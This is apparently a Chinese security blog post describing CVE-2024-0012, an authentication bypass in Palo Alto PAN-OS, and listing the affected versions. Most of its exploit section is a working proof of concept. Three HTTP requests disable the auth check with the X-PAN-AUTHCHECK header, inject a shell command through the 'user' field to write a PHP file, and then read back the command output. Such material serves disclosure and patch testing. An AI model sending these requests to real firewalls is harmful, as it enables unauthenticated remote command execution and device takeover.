#  CVE-2024-0012｜Palo Alto Networks PAN-OS身份验证绕过漏洞（POC）   
alicy  信安百科   2024-11-23 10:25  
  
**0x00 前言**  
  
  
派拓网络（Palo Alto Networks）是一家网络安全公司，总部位于美国加利福尼亚州圣克拉拉市。公司的核心产品为“下一代防火墙”（Next-Generation Firewall）平台，提供网络活动的可视化能力，可基于应用（App-ID）、用户（User-ID）与内容（Content-ID）进行网络活动的精细化控制，同时提供基于云的安全服务（GlobalProtect与WildFire）来拓展防火墙的安全性。  
  
  
  
**0x01 漏洞描述**  
  
  
未经身份验证的攻击者通过网络访问管理Web界面，从而获得PAN-OS管理员权限以执行管理操作、篡改配置或利用其他经过身份验证的特权提升漏洞（如CVE-2024-9474）。  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2024-0012：Palo Alto Networks PAN-OS身份验证绕过漏洞  
  
未经身份验证的攻击者通过网络访问管理Web界面，从而获得PAN-OS管理员权限以执行管理操作、篡改配置或利用其他经过身份验证的特权提升漏洞。  
  
  
CVE-2024-9474：Palo Alto Networks PAN-OS权限提升漏洞  
  
Palo Alto Networks PAN-OS软件中存在权限提升漏洞，可能导致具有管理Web 界面访问权限的PAN-OS管理员以root权限对防火墙执行恶意操作。  
  
  
  
**0x03 影响版本**  
  
  
PAN-OS 11.2 < 11.2.4-h1  
  
PAN-OS 11.1 < 11.1.5-h1  
  
PAN-OS 11.0 < 11.0.6-h1  
  
PAN-OS 10.2 < 10.2.12-h2  
  
  
  
**0x04 漏洞详情**  
  
****  
POC：  
  
首先：  
```
POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

user=`echo $(uname -a) > /var/appweb/htdocs/unauth/watchTowr.php`&userRole=superuser&remoteHost=&vsys=vsys1
```  
  
  
然后：  
  
使用第一步获取的PHPSESSID，请求index.php/.js.map触发第一步的请求。  
```
GET /index.php/.js.map HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=2qe3kouhjdm8317f6vmueh1m8n;
X-PAN-AUTHCHECK: off
Connection: keep-alive
```  
  
  
最后：  
  
请求第一步中命令写入的文件，验证命令是否执行，并且能访问到执行结果。  
```
GET /unauth/watchTowr.php HTTP/1.1
Host: 192.168.1.227
Cookie: PHPSESSID=fvepfik7vrmvdlkns30rgpn1jb;
X-PAN-AUTHCHECK: off
Connection: keep-alive
```  
  
```
HTTP/1.1 200 OK
Date: Tue, 19 Nov 2024 09:39:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 108
Connection: keep-alive
Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS

Linux PA-VM 4.18.0-240.1.1.20.pan.x86_64 #1 SMP Wed Jul 31 20:37:12 PDT 2024 x86_64 x86_64 x86_64 GNU/Linux
```  
  
  
****  
**0x05 参考链接**  
  
  
https://security.paloaltonetworks.com/CVE-2024-0012  
  
  
https://github.com/watchtowrlabs/palo-alto-panos-cve-2024-0012  
  
  
  
  
推荐阅读：  
  
  
[CVE-2024-37383｜Roundcube Webmail存储型XSS漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485685&idx=1&sn=838e54bc45cab050c38c37137d553fa1&chksm=cea9612cf9dee83a66a26a8c8fe596cd04d4638dc6581db8b0ed7312fe63559860d92e2a3dbd&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-9264｜Grafana SQL表达式允许远程代码执行（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485671&idx=2&sn=3c50f92d11faad65195774409be07b3b&chksm=cea9613ef9dee828fe54dcf107742dd30993caea07e0477c78d244ca86e048f76a75112725c5&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-9465｜Palo Alto Networks Expedition 未授权SQL注入漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485660&idx=2&sn=7c2fc6ead103e3d620304a476857465e&chksm=cea96105f9dee813d79bb9dc95becfdc8b0f80d294893cd068607339217d429b614999bb91c9&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
